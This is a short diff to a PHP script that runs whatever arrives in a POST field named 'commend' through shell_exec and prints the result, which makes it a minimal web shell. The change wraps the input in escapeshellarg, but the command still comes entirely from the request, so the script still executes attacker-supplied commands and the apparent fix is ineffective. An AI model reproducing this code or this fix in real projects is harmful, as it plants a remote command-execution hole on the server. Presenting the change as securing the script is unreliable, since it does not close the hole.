@@ -1,5 +1,5 @@
 <?php
-	$commend = $_POST["commend"];
+	$commend = escapeshellarg($_POST["commend"]);
 	$result = shell_exec($commend);
 	echo $result;
 ?>
